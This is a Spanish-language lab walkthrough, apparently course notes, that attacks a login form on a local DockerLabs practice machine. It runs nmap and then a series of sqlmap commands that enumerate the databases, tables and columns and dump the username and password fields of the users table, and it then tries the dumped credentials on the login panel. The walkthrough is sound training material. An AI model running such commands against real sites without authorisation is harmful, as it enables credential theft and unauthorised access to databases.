# Inyecciones SQL – Uso de SQLmap – EJEMPLO 2

Maquinas a utilizar **Kali Linux y Database** [DockerLabs](https://dockerlabs.es/)

- Desplegamos la maquina victima de la siguiente manera.
    
    Lo llevamos al muestra maquina Kali Linux y lo descomprimimos en el escritorio. En una terminal escribimos el siguiente comando:
    
    ```bash
    sudo bash auto_deploy.sh database.tar 
    ```
    
    ![image.png](./imagenes/image%20157.png)
    
    Nos indica la IP de la maquina victima **172.17.0.2**. Sin cerrar este terminal abrimos otro para continuar con la inyección SQL.
    
    ```bash
    nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 172.17.0.2 -oN escaneo
    ```
    
    ![image.png](./imagenes/image%20158.png)
    
    No vemos ninguna **base de datos,** esto es normal por que **no necesariamente** la base de datos **tiene que estar expuesta**. Puede ser que que podamos acceder a una base de datos desde cualquier equipo o como en esta la base de datos no tenga el puerto abierto.
    
- En el navegador web ponemos la IP de la maquina victima. Nos encontramos ante un panel de Login. Aquí hay una base de datos que esta corriendo de forma interna y por eso no la veíamos expuesta.
    
    ![image.png](./imagenes/image%20159.png)
    

- Aquí lo ideal es probar inyecciones SQL utilizando sqlmap.
    
    Vamos a meter un login erróneo por si nos mostrara el archivo en el que esta corriendo.
    
    ![image.png](./imagenes/image%20160.png)
    

- Vamos a intentar encontrar las **bases de datos** existentes **.**
    
    ```bash
    sqlmap -u http://172.17.0.2/index.php --forms --dbs --batch
    ```
    
    ![image.png](./imagenes/image%20161.png)
    

- Toca el turno de las **tablas** en una de las bases de datos en este caso en la base de datos “register”.
    
    ```bash
    sqlmap -u [http://172.17.0.2/index.php](./imagenes/http://172.17.0.2/index.php) --forms -D register --tables --batch
    ```
    
    ![image.png](./imagenes/image%20162.png)
    

- Tenemos la tabla “users”. Toca encontrar **columnas** dentro de esta tabla.
    
    ```bash
    sqlmap -u [http://172.17.0.2/index.php](./imagenes/http://172.17.0.2/index.php) --forms -D register -T users --columns --batch
    ```
    
    ![image.png](./imagenes/image%20163.png)
    
- Ya nos quedaría el ultimo paso que seria mostrar los **registros de las columnas**.
    
    ```bash
    sqlmap -u [http://172.17.0.2/index.php](./imagenes/http://172.17.0.2/index.php) --forms -D register -T users -C passwd,username --dump --batch
    ```
    
    ![image.png](./imagenes/image%20164.png)
    
- Vamos a probar las credenciales en el panel de login.
    
    ![image.png](./imagenes/image%20165.png)
    
    ![image.png](./imagenes/image%20166.png)